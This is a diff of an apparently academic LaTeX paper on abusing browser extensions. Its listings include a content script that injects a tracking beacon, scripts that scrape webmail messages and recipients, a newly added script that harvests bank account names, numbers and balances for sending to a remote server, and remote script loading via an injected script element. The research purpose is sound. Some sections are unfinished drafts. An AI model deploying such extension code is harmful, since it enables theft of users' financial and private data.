@@ -32,17 +32,18 @@
 
 	User tracking refers to the linking of multiple web pages that were visited by the same user. Applying this technique to web page's that belong to the same domain allows to follow the user's path through the domain's pages and determine his entry and exit points. This is commonly used for web analytics to help the website's author to improve the usability of his layout. User tracking between different domains produces an overview about the user's movement through the Internet. It is often used by advertising companies who extract the user's personal needs and preferences from the websites he visits to provide personalized advertisements.
 		
-	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking web page. If the identifier is retrieved on later occasions, it notifies the tracking party that the same user has accessed another web page. There exists several possibilities to store server data inside the browser. We have listed some approach which we found in several research papers:
+	The general method for user tracking includes a unique identifier which is intentionally stored on the user's machine the first time he visits a tracking web page. If the identifier is retrieved on later occasions, it notifies the tracking party that the same user has accessed another web page. There exists several possibilities to store data inside the browser. We have listed some approach which we found in several research papers:
+	
 	
 	
 	%TODO maybe rewrite
-%	\begin{itemize}
-%		\item \textbf{HTTP Cookies} Cookies are send back on every web request to their origin server. This simplifies user tracking, because the website's host does not have to take care about storing the cookie client-sided and retrieving it. 
-%		
-%		\item \textbf{Local Storage} In the HTML5 standard, every web page can use 
-%		
-%		\item \textbf{Browser Plugins} A plugin is a local application that is embedded in a web page. Commonly used plugins are Flash Player or Java. Because these applications are independent of the browser, they can store information across multiple browsers. 
-%	\end{itemize}
+	\begin{itemize}
+		\item \textbf{HTTP Cookies} Cookies are send back on every web request to their origin server. This simplifies user tracking, because the website's host does not have to take care about storing the cookie client-sided and retrieving it. 
+		
+		\item \textbf{Local Storage} 
+		
+		\item \textbf{Browser Plugins} A plugin is a local application that is embedded in a web page. Commonly used plugins are Flash Player or Java. Because these applications are independent of the browser, they can store information across multiple browsers. 
+	\end{itemize}
 	
 	\begin{itemize}
 		\item \textbf{Tracking Cookies} The most used web technology to track users are HTTP cookies. If a user visits a web page that includes a resource from a tracking third-party, a cookie is fetched together with the requested resource and acts as an identifier for the user. When the user now visits a second web page that again includes some resource from the third-party, the stored cookie is send along with the request for the third-party's resource. The third-party vendor has now successfully tracked the user between two different web pages.  
@@ -58,7 +59,7 @@
 	
 	To allow user tracking between different websites, the developers have to explicit include the web beacon into their web pages. We use an extension which has full access to any visited web page and add the web beacon to the DOM of each web page. If we send a tracking cookies along the corresponding request, we are able to remotely track the user because our server gets notified every time the user loads a new web page. 
 	
-	We implemented a content script that embeds an image which it fetches from our remote server in every visited web page. Besides the content script, there is no need for additional permission. We show the implementation of our content script in \autoref{code:webBeacon}. We start by creating a new image element (line 1), set its source attribute to the URL of our remote server (line 2), and finally add it to the web page's DOM (line 3) which subsequently sends a request with probably stored tracking cookies to our remote server.
+	We implemented a content script that embeds an image which it fetches from our remote server in every visited web page. Besides the content script, there is no need for additional permissions. We show the implementation of our content script in \autoref{code:webBeacon}. We start by creating a new image element (line 1), set its source attribute to the URL of our remote server (line 2), and finally add it to the web page's DOM (line 3) which subsequently sends a request with probably stored tracking cookies to our remote server.
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -206,7 +207,7 @@ chrome.bookmarks.getTree(function(root) {
 	
 	\begin{code}
 		\begin{lstlisting}
-if(window.location.host === 'email.t-online.de' && window.location.href.indexOf('showWritemail') !== -1) {
+if(window.location.hostname === TARGETED_HOSTNAME && window.location.href.indexOf('showWritemail') !== -1) {
 	$('div#toolbarLeft a.toolbarItem.single.normal').click(function() {
 		chrome.runtime.sendMessage({
 			'recipients': $('div#fieldTo ul li').not(':first-child').text(),
@@ -247,7 +248,7 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 	
 	\begin{code}
 		\begin{lstlisting}
-if(window.location.host === TARGETED_URL && window.location.href.indexOf('showReadmail') !== -1) {
+if(window.location.hostname === TARGETED_HOSTNAME && window.location.href.indexOf('showReadmail') !== -1) {
 	$(document).ready(function() {
 		chrome.runtime.sendMessage({
 			'subject': $('a[name = subjectslim]').text(),
@@ -256,7 +257,7 @@ if(window.location.host === TARGETED_URL && window.location.href.indexOf('showRe
 		});
 	});
 }
-if(window.location.host === 'email.t-online.de' && window.self !== window.top && window.frameElement.id === "messageBody") {
+if(window.location.hostname === TARGETED_HOSTNAME && window.self !== window.top && window.frameElement.id === "messageBody") {
 	chrome.runtime.sendMessage({'mailOpened': true});
 }
 \end{lstlisting}	
@@ -331,6 +332,31 @@ if(window.location.host === 'www.facebook.com') {
 \subsubsection{Online Banking}
 
 	%TODO implement + write
+
+	First, we check if the current web page's host equals the targeted banking portal (line 1). Then, we query for any second level heading element on the web page (line 2). We filter the returned list of headings and retrieve (line 3).
+
+	\begin{code}
+		\begin{lstlisting}
+if(window.location.hostname === TARGETED_HOSTNAME) {
+	var heading = $('h2').filter(function() {
+		return($(this).text() === 'Financial status');
+	});
+	if(heading.length !== 0) {
+		var accounts = [];
+		$('div.if5_seiten tr[class^=tablerow]').each(function() {
+			accounts.push({
+				'account_name': $(this).find('td:nth-child(1)').text(),
+				'account_number': $(this).find('td:nth-child(2)').text(),
+				'account_balance': $(this).find('td:nth-child(3)').text()
+			});
+		});
+		send(accounts);
+	}
+}
+\end{lstlisting}
+		\caption{Content script that retrieves the user's banking account information.}
+		\label{code:readBankingData}
+	\end{code}
 
 	\begin{table}
 		\centering
@@ -427,7 +453,7 @@ function send(data) {
 	
 \subsubsection{Script Element In Content Script}
 
-	If we want to execute a remote loaded script only in the scope of a web page, we can take use of the DOM API. It allows us to add a new script element to the current web page. If we set the source attribute of the script element to the URL of our remote server, the browser will fetch and execute the script for us. We implemented the content script shown in \autoref{contentScriptRemotLoad} which executes a remotely loaded script in any web page without the need for further permissions. The content script creates a new script element (line 1), sets the element's source attribute to the URL of our remote server (line 2), and appends it to the web page's body (line 3). The remote loaded script is immediately executed.
+	If we want to execute a remote loaded script only in the scope of a web page, we can take use of the DOM API. It allows us to add a new script element to the current web page. If we set the source attribute of the script element to the URL of our remote server, the browser will fetch and execute the script for us. We implemented the content script shown in \autoref{code:loadScriptWithScriptElement} which executes a remotely loaded script in any web page without the need for further permissions. The content script creates a new script element (line 1), sets the element's source attribute to the URL of our remote server (line 2), and appends it to the web page's body (line 3). The remote loaded script is immediately executed.
 	
 	\begin{code}
 		\begin{lstlisting}
